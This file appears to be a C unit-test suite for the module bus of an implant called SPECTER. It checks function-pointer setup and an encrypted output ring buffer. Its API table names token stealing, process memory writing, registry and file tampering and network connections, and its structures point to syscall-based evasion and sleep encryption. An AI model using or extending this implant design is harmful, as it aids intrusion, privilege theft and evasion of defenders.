/**
 * SPECTER Implant — Module Bus API Test Suite
 *
 * Tests bus_init function table population and encrypted output ring
 * buffer roundtrip (write → drain → verify).
 *
 * Build: gcc -o test_bus_api test_bus_api.c ../core/src/crypto.c
 *            ../core/src/string.c ../core/src/hash.c
 *            ../core/src/bus/bus_api.c
 *            -I../core/include -DTEST_BUILD
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* ------------------------------------------------------------------ */
/*  Type stubs (same pattern as test_crypto.c)                         */
/* ------------------------------------------------------------------ */

typedef unsigned char       BYTE;
typedef unsigned short      WORD;
typedef unsigned short      USHORT;
typedef unsigned int        DWORD;
typedef unsigned long long  QWORD;
typedef unsigned long long  ULONG_PTR;
typedef unsigned long long  SIZE_T;
typedef long                LONG;
typedef long                NTSTATUS;
typedef int                 BOOL;
typedef unsigned int        ULONG;
typedef short               SHORT;
typedef unsigned short      WCHAR;
typedef char                CHAR;
typedef unsigned char       UCHAR;
typedef void                VOID;
typedef void*               PVOID;
typedef void*               HANDLE;
typedef void**              PHANDLE;
typedef BYTE*               PBYTE;
typedef DWORD*              PDWORD;
typedef ULONG*              PULONG;
typedef SIZE_T*             PSIZE_T;
typedef WCHAR*              PWCHAR;
typedef const char*         PCSTR;
typedef const WCHAR*        PCWSTR;
typedef LONG*               PLONG;

#define TRUE  1
#define FALSE 0
#ifndef NULL
#define NULL ((void*)0)
#endif
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#define STATUS_SUCCESS          ((NTSTATUS)0x00000000)
#define STATUS_INVALID_PARAMETER ((NTSTATUS)0xC000000D)
#define INVALID_HANDLE_VALUE    ((HANDLE)(ULONG_PTR)-1)

/* Stub PE / PEB structures */
typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWCHAR Buffer; } UNICODE_STRING, *PUNICODE_STRING;
typedef struct _LIST_ENTRY { struct _LIST_ENTRY *Flink, *Blink; } LIST_ENTRY, *PLIST_ENTRY;
typedef struct _LDR_DATA_TABLE_ENTRY { LIST_ENTRY InLoadOrderLinks; LIST_ENTRY InMemoryOrderLinks; LIST_ENTRY InInitializationOrderLinks; PVOID DllBase; PVOID EntryPoint; ULONG SizeOfImage; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName; ULONG Flags; USHORT LoadCount; USHORT TlsIndex; LIST_ENTRY HashLinks; ULONG TimeDateStamp; } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
typedef struct _PEB_LDR_DATA { ULONG Length; BOOL Initialized; PVOID SsHandle; LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; } PEB_LDR_DATA, *PPEB_LDR_DATA;
typedef struct _PEB { BYTE InheritedAddressSpace; BYTE ReadImageFileExecOptions; BYTE BeingDebugged; BYTE BitField; BYTE Padding0[4]; PVOID Mutant; PVOID ImageBaseAddress; PPEB_LDR_DATA Ldr; } PEB, *PPEB;

typedef struct _IMAGE_DOS_HEADER { WORD e_magic; WORD e_cblp; WORD e_cp; WORD e_crlc; WORD e_cparhdr; WORD e_minalloc; WORD e_maxalloc; WORD e_ss; WORD e_sp; WORD e_csum; WORD e_ip; WORD e_cs; WORD e_lfarlc; WORD e_ovno; WORD e_res[4]; WORD e_oemid; WORD e_oeminfo; WORD e_res2[10]; LONG e_lfanew; } IMAGE_DOS_HEADER;
typedef struct _IMAGE_FILE_HEADER { WORD Machine; WORD NumberOfSections; DWORD TimeDateStamp; DWORD PointerToSymbolTable; DWORD NumberOfSymbols; WORD SizeOfOptionalHeader; WORD Characteristics; } IMAGE_FILE_HEADER;
typedef struct _IMAGE_DATA_DIRECTORY { DWORD VirtualAddress; DWORD Size; } IMAGE_DATA_DIRECTORY;
#define IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16
#define IMAGE_DIRECTORY_ENTRY_EXPORT 0
typedef struct _IMAGE_OPTIONAL_HEADER64 { WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; DWORD SizeOfInitializedData; DWORD SizeOfUninitializedData; DWORD AddressOfEntryPoint; DWORD BaseOfCode; QWORD ImageBase; DWORD SectionAlignment; DWORD FileAlignment; WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; DWORD SizeOfImage; DWORD SizeOfHeaders; DWORD CheckSum; WORD Subsystem; WORD DllCharacteristics; QWORD SizeOfStackReserve; QWORD SizeOfStackCommit; QWORD SizeOfHeapReserve; QWORD SizeOfHeapCommit; DWORD LoaderFlags; DWORD NumberOfRvaAndSizes; IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; } IMAGE_OPTIONAL_HEADER64;
typedef struct _IMAGE_NT_HEADERS64 { DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER64 OptionalHeader; } IMAGE_NT_HEADERS64;
typedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; DWORD Base; DWORD NumberOfFunctions; DWORD NumberOfNames; DWORD AddressOfFunctions; DWORD AddressOfNames; DWORD AddressOfNameOrdinals; } IMAGE_EXPORT_DIRECTORY;
typedef struct _IMAGE_SECTION_HEADER { BYTE Name[8]; DWORD VirtualSize; DWORD VirtualAddress; DWORD SizeOfRawData; DWORD PointerToRawData; DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics; } IMAGE_SECTION_HEADER;

/* Stub NT structures */
typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
typedef struct _IO_STATUS_BLOCK { union { NTSTATUS Status; PVOID Pointer; }; ULONG_PTR Information; } IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;
typedef struct _CLIENT_ID { HANDLE UniqueProcess; HANDLE UniqueThread; } CLIENT_ID, *PCLIENT_ID;
typedef union _LARGE_INTEGER { struct { DWORD LowPart; LONG HighPart; }; long long QuadPart; } LARGE_INTEGER, *PLARGE_INTEGER;
typedef enum _PROCESSINFOCLASS { ProcessBasicInformation = 0 } PROCESSINFOCLASS;
typedef enum _SECTION_INHERIT { ViewShare = 1, ViewUnmap = 2 } SECTION_INHERIT;

#define PAGE_NOACCESS           0x01
#define PAGE_READONLY           0x02
#define PAGE_READWRITE          0x04
#define PAGE_EXECUTE_READ       0x20
#define PAGE_EXECUTE_READWRITE  0x40
#define MEM_COMMIT              0x00001000
#define MEM_RESERVE             0x00002000
#define MEM_DECOMMIT            0x00004000
#define MEM_RELEASE             0x00008000
#define STATUS_UNSUCCESSFUL     ((NTSTATUS)0xC0000001)
#define STATUS_NO_MEMORY        ((NTSTATUS)0xC0000017)
#define STATUS_PROCEDURE_NOT_FOUND ((NTSTATUS)0xC000007A)
#define OBJ_CASE_INSENSITIVE    0x00000040

typedef struct _SYSCALL_ENTRY { DWORD ssn; PVOID syscall_addr; DWORD hash; } SYSCALL_ENTRY;
typedef struct _SYSCALL_TABLE { SYSCALL_ENTRY entries[50]; DWORD count; PVOID clean_ntdll; } SYSCALL_TABLE;
typedef struct _IMPLANT_CONTEXT { SYSCALL_TABLE *syscall_table; PVOID clean_ntdll; PVOID config; PVOID comms_ctx; PVOID sleep_ctx; PVOID evasion_ctx; PVOID module_bus; BOOL running; } IMPLANT_CONTEXT;

IMPLANT_CONTEXT g_ctx;

/* ------------------------------------------------------------------ */
/*  CRT-free function stubs (delegate to libc for tests)               */
/* ------------------------------------------------------------------ */

SIZE_T spec_strlen(const char *s) { return strlen(s); }
SIZE_T spec_wcslen(const WCHAR *s) { SIZE_T n=0; while(s[n]) n++; return n; }
int spec_strcmp(const char *a, const char *b) { return strcmp(a,b); }
int spec_wcsicmp(const WCHAR *a, const WCHAR *b) { (void)a; (void)b; return 0; }
void *spec_memcpy(void *d, const void *s, SIZE_T n) { return memcpy(d,s,n); }
void *spec_memmove(void *d, const void *s, SIZE_T n) { return memmove(d,s,n); }
void *spec_memset(void *d, int c, SIZE_T n) { return memset(d,c,n); }
int spec_memcmp(const void *a, const void *b, SIZE_T n) { return memcmp(a,b,n); }
char *spec_strcpy(char *d, const char *s) { return strcpy(d,s); }
char *spec_strcat(char *d, const char *s) { return strcat(d,s); }
DWORD spec_djb2_hash(const char *str) {
    DWORD h = 5381; int c;
    while ((c = *str++)) {
        if (c >= 'A' && c <= 'Z') c += 0x20;
        h = ((h << 5) + h) + c;
    }
    return h;
}
DWORD spec_djb2_hash_w(const WCHAR *str) { (void)str; return 0; }

/* PEB stubs */
PPEB get_peb(void) { return NULL; }
PVOID find_module_by_hash(DWORD h) { (void)h; return NULL; }
PVOID find_export_by_hash(PVOID m, DWORD h) { (void)m; (void)h; return NULL; }
PVOID resolve_function(DWORD mh, DWORD fh) { (void)mh; (void)fh; return NULL; }

/* Syscall / evasion stubs */
SYSCALL_TABLE g_syscall_table;
SYSCALL_ENTRY *sc_get_entry(SYSCALL_TABLE *t, DWORD h) { (void)t; (void)h; return NULL; }
NTSTATUS evasion_syscall(void *ctx, DWORD func_hash, ...) { (void)ctx; (void)func_hash; return STATUS_PROCEDURE_NOT_FOUND; }
NTSTATUS spec_syscall(DWORD ssn, PVOID addr, ...) { (void)ssn; (void)addr; return STATUS_PROCEDURE_NOT_FOUND; }

/* Sleep tracking stubs */
typedef struct _HEAP_ALLOC_ENTRY { PVOID ptr; SIZE_T size; struct _HEAP_ALLOC_ENTRY *next; } HEAP_ALLOC_ENTRY;
typedef struct _SLEEP_CONTEXT { DWORD sleep_method; PVOID implant_base; SIZE_T implant_size; HEAP_ALLOC_ENTRY *heap_list; BYTE sleep_enc_key[32]; ULONG original_protect; } SLEEP_CONTEXT;
void sleep_track_alloc(SLEEP_CONTEXT *s, PVOID p, SIZE_T sz) { (void)s; (void)p; (void)sz; }
void sleep_untrack_alloc(SLEEP_CONTEXT *s, PVOID p) { (void)s; (void)p; }

/* Now include bus.h and crypto function declarations */
#define CHACHA20_KEY_SIZE    32
#define CHACHA20_NONCE_SIZE  12
#define CHACHA20_BLOCK_SIZE  64
#define POLY1305_KEY_SIZE    32
#define POLY1305_TAG_SIZE    16
#define AEAD_KEY_SIZE        32
#define AEAD_NONCE_SIZE      12
#define AEAD_TAG_SIZE        16
#define X25519_KEY_SIZE      32
#define SHA256_BLOCK_SIZE    64
#define SHA256_DIGEST_SIZE   32
#define HKDF_SHA256_HASH_LEN 32
#define HASH_BCRYPT_DLL      0x730076C3
#define HASH_BCRYPTGENRANDOM 0xE59BE6B4

typedef struct _SHA256_CTX {
    DWORD state[8];
    QWORD bitcount;
    BYTE buffer[64];
    DWORD buf_len;
} SHA256_CTX;

/* Crypto functions declared (implemented in crypto.c) */
void spec_chacha20_block(const DWORD state[16], BYTE output[64]);
void spec_chacha20_encrypt(const BYTE key[32], const BYTE nonce[12],
                           DWORD counter, const BYTE *plaintext,
                           DWORD len, BYTE *ciphertext);
void spec_sha256(const BYTE *data, DWORD len, BYTE digest[32]);

/* Bus API declarations */
#define OUTPUT_TEXT     0
#define OUTPUT_BINARY   1
#define OUTPUT_ERROR    2
#define LOG_DEBUG   0
#define LOG_INFO    1
#define LOG_WARN    2
#define LOG_ERROR   3
#define BUS_OUTPUT_RING_SIZE    4096
#define BUS_OUTPUT_ENTRY_MAX    512

typedef struct _OUTPUT_RING {
    BYTE    data[BUS_OUTPUT_RING_SIZE];
    DWORD   head;
    DWORD   tail;
    DWORD   count;
    BYTE    enc_key[32];
    BYTE    enc_nonce[12];
    BOOL    encrypted;
} OUTPUT_RING;

typedef struct _MODULE_BUS_API {
    PVOID     (*mem_alloc)(SIZE_T size, DWORD perms);
    BOOL      (*mem_free)(PVOID ptr);
    BOOL      (*mem_protect)(PVOID ptr, SIZE_T size, DWORD perms);
    HANDLE    (*net_connect)(const char *addr, DWORD port, DWORD proto);
    BOOL      (*net_send)(HANDLE handle, const BYTE *data, DWORD len);
    DWORD     (*net_recv)(HANDLE handle, BYTE *buf, DWORD len);
    BOOL      (*net_close)(HANDLE handle);
    HANDLE    (*proc_open)(DWORD pid, DWORD access);
    BOOL      (*proc_read)(HANDLE handle, PVOID addr, BYTE *buf, DWORD len);
    BOOL      (*proc_write)(HANDLE handle, PVOID addr, const BYTE *data, DWORD len);
    BOOL      (*proc_close)(HANDLE handle);
    HANDLE    (*thread_create)(PVOID func, PVOID param, BOOL suspended);
    BOOL      (*thread_resume)(HANDLE handle);
    BOOL      (*thread_terminate)(HANDLE handle);
    HANDLE    (*token_steal)(DWORD pid);
    BOOL      (*token_impersonate)(HANDLE handle);
    BOOL      (*token_revert)(void);
    HANDLE    (*token_make)(const char *user, const char *pass, const char *domain);
    DWORD     (*file_read)(const char *path, BYTE *buf, DWORD len);
    BOOL      (*file_write)(const char *path, const BYTE *data, DWORD len);
    BOOL      (*file_delete)(const char *path);
    PVOID     (*file_list)(const char *path);
    DWORD     (*reg_read)(DWORD hive, const char *path, const char *value);
    BOOL      (*reg_write)(DWORD hive, const char *path, const char *value,
                           const BYTE *data, DWORD type);
    BOOL      (*reg_delete)(DWORD hive, const char *path, const char *value);
    BOOL      (*output)(const BYTE *data, DWORD len, DWORD type);
    PVOID     (*resolve)(const char *dll_name, const char *func_name);
    void      (*log)(DWORD level, const char *msg);
} MODULE_BUS_API;

typedef struct _BUS_CONTEXT {
    MODULE_BUS_API  api;
    OUTPUT_RING     output_ring;
    PVOID           implant_ctx;
    BOOL            initialized;
} BUS_CONTEXT;

/* External bus functions */
NTSTATUS bus_init(IMPLANT_CONTEXT *ctx);
MODULE_BUS_API *bus_get_api(BUS_CONTEXT *bctx);
BOOL output_write(OUTPUT_RING *ring, const BYTE *data, DWORD len, DWORD type);
DWORD output_drain(OUTPUT_RING *ring, BYTE *dest, DWORD dest_len);
void output_reset(OUTPUT_RING *ring);
DWORD output_available(const OUTPUT_RING *ring);
void bus_test_set_ring_key(OUTPUT_RING *ring, const BYTE key[32],
                           const BYTE nonce[12]);

/* ------------------------------------------------------------------ */
/*  Test helpers                                                       */
/* ------------------------------------------------------------------ */

static int tests_run = 0;
static int tests_passed = 0;

static void check(const char *name, int condition) {
    tests_run++;
    if (condition) {
        tests_passed++;
        printf("[PASS] %s\n", name);
    } else {
        printf("[FAIL] %s\n", name);
    }
}

static void hex_dump(const BYTE *data, int len) {
    for (int i = 0; i < len; i++)
        printf("%02x", data[i]);
}

static int check_bytes(const char *name, const BYTE *got, const BYTE *expected, int len) {
    tests_run++;
    if (memcmp(got, expected, len) == 0) {
        tests_passed++;
        printf("[PASS] %s\n", name);
        return 1;
    } else {
        printf("[FAIL] %s\n", name);
        printf("  Expected: "); hex_dump(expected, len); printf("\n");
        printf("  Got:      "); hex_dump(got, len); printf("\n");
        return 0;
    }
}

/* ------------------------------------------------------------------ */
/*  Test: bus_init populates all function pointers                     */
/* ------------------------------------------------------------------ */

static void test_bus_init_populates_all_pointers(void) {
    printf("\n--- bus_init populates all function pointers ---\n");

    memset(&g_ctx, 0, sizeof(g_ctx));
    NTSTATUS status = bus_init(&g_ctx);

    check("bus_init returns STATUS_SUCCESS",
          NT_SUCCESS(status));

    check("bus_init sets module_bus in context",
          g_ctx.module_bus != NULL);

    BUS_CONTEXT *bctx = (BUS_CONTEXT *)g_ctx.module_bus;

    check("bus context is initialized",
          bctx->initialized == TRUE);

    MODULE_BUS_API *api = bus_get_api(bctx);
    check("bus_get_api returns non-NULL",
          api != NULL);

    /* Verify all function pointers are populated */
    check("mem_alloc populated",      api->mem_alloc != NULL);
    check("mem_free populated",       api->mem_free != NULL);
    check("mem_protect populated",    api->mem_protect != NULL);

    check("net_connect populated",    api->net_connect != NULL);
    check("net_send populated",       api->net_send != NULL);
    check("net_recv populated",       api->net_recv != NULL);
    check("net_close populated",      api->net_close != NULL);

    check("proc_open populated",      api->proc_open != NULL);
    check("proc_read populated",      api->proc_read != NULL);
    check("proc_write populated",     api->proc_write != NULL);
    check("proc_close populated",     api->proc_close != NULL);

    check("thread_create populated",  api->thread_create != NULL);
    check("thread_resume populated",  api->thread_resume != NULL);
    check("thread_terminate populated", api->thread_terminate != NULL);

    check("token_steal populated",    api->token_steal != NULL);
    check("token_impersonate populated", api->token_impersonate != NULL);
    check("token_revert populated",   api->token_revert != NULL);
    check("token_make populated",     api->token_make != NULL);

    check("file_read populated",      api->file_read != NULL);
    check("file_write populated",     api->file_write != NULL);
    check("file_delete populated",    api->file_delete != NULL);
    check("file_list populated",      api->file_list != NULL);

    check("reg_read populated",       api->reg_read != NULL);
    check("reg_write populated",      api->reg_write != NULL);
    check("reg_delete populated",     api->reg_delete != NULL);

    check("output populated",         api->output != NULL);
    check("resolve populated",        api->resolve != NULL);
    check("log populated",            api->log != NULL);
}

/* ------------------------------------------------------------------ */
/*  Test: bus_init with NULL context                                   */
/* ------------------------------------------------------------------ */

static void test_bus_init_null_ctx(void) {
    printf("\n--- bus_init with NULL context ---\n");
    NTSTATUS status = bus_init(NULL);
    check("bus_init(NULL) returns error", !NT_SUCCESS(status));
}

/* ------------------------------------------------------------------ */
/*  Test: bus_get_api with NULL/uninitialized                          */
/* ------------------------------------------------------------------ */

static void test_bus_get_api_null(void) {
    printf("\n--- bus_get_api edge cases ---\n");
    check("bus_get_api(NULL) returns NULL", bus_get_api(NULL) == NULL);

    BUS_CONTEXT uninitialized;
    memset(&uninitialized, 0, sizeof(uninitialized));
    check("bus_get_api(uninitialized) returns NULL",
          bus_get_api(&uninitialized) == NULL);
}

/* ------------------------------------------------------------------ */
/*  Test: output ring buffer roundtrip                                 */
/* ------------------------------------------------------------------ */

static void test_output_ring_roundtrip(void) {
    printf("\n--- output ring buffer roundtrip ---\n");

    /* Initialize bus to get a ring buffer */
    memset(&g_ctx, 0, sizeof(g_ctx));
    bus_init(&g_ctx);
    BUS_CONTEXT *bctx = (BUS_CONTEXT *)g_ctx.module_bus;
    OUTPUT_RING *ring = &bctx->output_ring;

    /* Set deterministic key for testing */
    BYTE test_key[32];
    BYTE test_nonce[12];
    memset(test_key, 0x42, 32);
    memset(test_nonce, 0x13, 12);
    bus_test_set_ring_key(ring, test_key, test_nonce);

    /* Initially empty */
    check("ring starts empty", output_available(ring) == 0);

    /* Write some data */
    const BYTE msg[] = "Hello, module bus!";
    DWORD msg_len = (DWORD)strlen((const char *)msg);

    BOOL ok = output_write(ring, msg, msg_len, OUTPUT_TEXT);
    check("output_write succeeds", ok == TRUE);
    check("ring count > 0 after write", output_available(ring) > 0);

    /* Verify data is encrypted in the ring (not plaintext) */
    int found_plain = 0;
    for (DWORD i = 0; i <= BUS_OUTPUT_RING_SIZE - msg_len; i++) {
        if (memcmp(ring->data + i, msg, msg_len) == 0) {
            found_plain = 1;
            break;
        }
    }
    check("data is encrypted in ring (not plaintext)", found_plain == 0);

    /* Drain and verify content */
    BYTE drain_buf[256];
    memset(drain_buf, 0, sizeof(drain_buf));
    DWORD drained = output_drain(ring, drain_buf, sizeof(drain_buf));

    check("drain returns correct length", drained == msg_len);
    check_bytes("drained data matches original", drain_buf, msg, msg_len);

    /* Ring should be empty after drain */
    check("ring empty after drain", output_available(ring) == 0);
}

/* ------------------------------------------------------------------ */
/*  Test: output ring buffer multiple writes                           */
/* ------------------------------------------------------------------ */

static void test_output_ring_multiple_writes(void) {
    printf("\n--- output ring buffer multiple writes ---\n");

    memset(&g_ctx, 0, sizeof(g_ctx));
    bus_init(&g_ctx);
    BUS_CONTEXT *bctx = (BUS_CONTEXT *)g_ctx.module_bus;
    OUTPUT_RING *ring = &bctx->output_ring;

    BYTE test_key[32], test_nonce[12];
    memset(test_key, 0xAB, 32);
    memset(test_nonce, 0xCD, 12);
    bus_test_set_ring_key(ring, test_key, test_nonce);

    /* Write three messages */
    const BYTE msg1[] = "First message";
    const BYTE msg2[] = "Second msg";
    const BYTE msg3[] = "Third!";

    BOOL ok1 = output_write(ring, msg1, (DWORD)strlen((const char *)msg1), OUTPUT_TEXT);
    BOOL ok2 = output_write(ring, msg2, (DWORD)strlen((const char *)msg2), OUTPUT_BINARY);
    BOOL ok3 = output_write(ring, msg3, (DWORD)strlen((const char *)msg3), OUTPUT_ERROR);

    check("write 1 succeeds", ok1);
    check("write 2 succeeds", ok2);
    check("write 3 succeeds", ok3);

    /* Drain all — should get concatenated payloads */
    BYTE drain_buf[512];
    memset(drain_buf, 0, sizeof(drain_buf));
    DWORD drained = output_drain(ring, drain_buf, sizeof(drain_buf));

    DWORD expected_len = (DWORD)(strlen((const char *)msg1) +
                                  strlen((const char *)msg2) +
                                  strlen((const char *)msg3));
    check("total drained length matches", drained == expected_len);

    /* Verify order: msg1 + msg2 + msg3 */
    DWORD off = 0;
    check_bytes("first message correct", drain_buf + off, msg1,
                (int)strlen((const char *)msg1));
    off += (DWORD)strlen((const char *)msg1);
    check_bytes("second message correct", drain_buf + off, msg2,
                (int)strlen((const char *)msg2));
    off += (DWORD)strlen((const char *)msg2);
    check_bytes("third message correct", drain_buf + off, msg3,
                (int)strlen((const char *)msg3));

    check("ring empty after full drain", output_available(ring) == 0);
}

/* ------------------------------------------------------------------ */
/*  Test: output ring buffer overflow protection                       */
/* ------------------------------------------------------------------ */

static void test_output_ring_overflow(void) {
    printf("\n--- output ring buffer overflow ---\n");

    memset(&g_ctx, 0, sizeof(g_ctx));
    bus_init(&g_ctx);
    BUS_CONTEXT *bctx = (BUS_CONTEXT *)g_ctx.module_bus;
    OUTPUT_RING *ring = &bctx->output_ring;

    BYTE test_key[32], test_nonce[12];
    memset(test_key, 0x55, 32);
    memset(test_nonce, 0x77, 12);
    bus_test_set_ring_key(ring, test_key, test_nonce);

    /* Fill ring close to capacity with many small writes.
     * Each entry = 8 (header) + payload bytes.
     * Ring size = 4096. Write 100-byte chunks → ~34 entries max. */
    BYTE chunk[100];
    memset(chunk, 'X', sizeof(chunk));

    int writes = 0;
    while (output_write(ring, chunk, sizeof(chunk), OUTPUT_BINARY))
        writes++;

    check("multiple writes succeeded before full", writes > 0);
    check("ring reports data available", output_available(ring) > 0);

    /* Next write should fail (ring full) */
    BOOL overflow = output_write(ring, chunk, sizeof(chunk), OUTPUT_BINARY);
    check("write fails when ring full", overflow == FALSE);
}

/* ------------------------------------------------------------------ */
/*  Test: output_write edge cases                                      */
/* ------------------------------------------------------------------ */

static void test_output_write_edge_cases(void) {
    printf("\n--- output_write edge cases ---\n");

    check("output_write(NULL ring) returns FALSE",
          output_write(NULL, (const BYTE *)"x", 1, OUTPUT_TEXT) == FALSE);

    OUTPUT_RING ring;
    memset(&ring, 0, sizeof(ring));
    BYTE test_key[32], test_nonce[12];
    memset(test_key, 0x11, 32);
    memset(test_nonce, 0x22, 12);
    bus_test_set_ring_key(&ring, test_key, test_nonce);

    check("output_write(NULL data) returns FALSE",
          output_write(&ring, NULL, 10, OUTPUT_TEXT) == FALSE);
    check("output_write(zero len) returns FALSE",
          output_write(&ring, (const BYTE *)"x", 0, OUTPUT_TEXT) == FALSE);

    /* Write exactly BUS_OUTPUT_ENTRY_MAX bytes should succeed */
    BYTE big_buf[BUS_OUTPUT_ENTRY_MAX];
    memset(big_buf, 'A', BUS_OUTPUT_ENTRY_MAX);
    check("output_write(max entry size) succeeds",
          output_write(&ring, big_buf, BUS_OUTPUT_ENTRY_MAX, OUTPUT_BINARY) == TRUE);

    /* Write BUS_OUTPUT_ENTRY_MAX + 1 bytes should fail */
    BYTE too_big[BUS_OUTPUT_ENTRY_MAX + 1];
    memset(too_big, 'B', sizeof(too_big));
    check("output_write(max+1) returns FALSE",
          output_write(&ring, too_big, BUS_OUTPUT_ENTRY_MAX + 1, OUTPUT_BINARY) == FALSE);
}

/* ------------------------------------------------------------------ */
/*  Test: output_drain edge cases                                      */
/* ------------------------------------------------------------------ */

static void test_output_drain_edge_cases(void) {
    printf("\n--- output_drain edge cases ---\n");

    BYTE buf[64];
    check("output_drain(NULL ring) returns 0",
          output_drain(NULL, buf, sizeof(buf)) == 0);

    OUTPUT_RING ring;
    memset(&ring, 0, sizeof(ring));
    check("output_drain(empty ring) returns 0",
          output_drain(&ring, buf, sizeof(buf)) == 0);
    check("output_drain(NULL dest) returns 0",
          output_drain(&ring, NULL, sizeof(buf)) == 0);
}

/* ------------------------------------------------------------------ */
/*  Test: output_reset clears state                                    */
/* ------------------------------------------------------------------ */

static void test_output_reset(void) {
    printf("\n--- output_reset ---\n");

    memset(&g_ctx, 0, sizeof(g_ctx));
    bus_init(&g_ctx);
    BUS_CONTEXT *bctx = (BUS_CONTEXT *)g_ctx.module_bus;
    OUTPUT_RING *ring = &bctx->output_ring;

    /* Write some data */
    const BYTE msg[] = "test data";
    output_write(ring, msg, (DWORD)strlen((const char *)msg), OUTPUT_TEXT);
    check("ring has data before reset", output_available(ring) > 0);

    /* Reset */
    output_reset(ring);
    check("ring empty after reset", output_available(ring) == 0);
    check("head is 0 after reset", ring->head == 0);
    check("tail is 0 after reset", ring->tail == 0);
}

/* ------------------------------------------------------------------ */
/*  Test: output via bus API function pointer                          */
/* ------------------------------------------------------------------ */

static void test_bus_output_api(void) {
    printf("\n--- bus output via API function pointer ---\n");

    memset(&g_ctx, 0, sizeof(g_ctx));
    bus_init(&g_ctx);
    BUS_CONTEXT *bctx = (BUS_CONTEXT *)g_ctx.module_bus;
    OUTPUT_RING *ring = &bctx->output_ring;

    BYTE test_key[32], test_nonce[12];
    memset(test_key, 0xDE, 32);
    memset(test_nonce, 0xAD, 12);
    bus_test_set_ring_key(ring, test_key, test_nonce);

    MODULE_BUS_API *api = bus_get_api(bctx);

    /* Use the output function pointer */
    const BYTE msg[] = "via api pointer";
    DWORD msg_len = (DWORD)strlen((const char *)msg);
    BOOL ok = api->output(msg, msg_len, OUTPUT_TEXT);
    check("api->output() succeeds", ok == TRUE);

    /* Drain and verify */
    BYTE drain_buf[128];
    memset(drain_buf, 0, sizeof(drain_buf));
    DWORD drained = output_drain(ring, drain_buf, sizeof(drain_buf));
    check("drained correct length", drained == msg_len);
    check_bytes("drained matches original", drain_buf, msg, msg_len);
}

/* ------------------------------------------------------------------ */
/*  main                                                               */
/* ------------------------------------------------------------------ */

int main(void) {
    printf("=== SPECTER Module Bus API Tests ===\n");

    test_bus_init_populates_all_pointers();
    test_bus_init_null_ctx();
    test_bus_get_api_null();
    test_output_ring_roundtrip();
    test_output_ring_multiple_writes();
    test_output_ring_overflow();
    test_output_write_edge_cases();
    test_output_drain_edge_cases();
    test_output_reset();
    test_bus_output_api();

    printf("\n=== Results: %d/%d passed ===\n", tests_passed, tests_run);
    return (tests_passed == tests_run) ? 0 : 1;
}
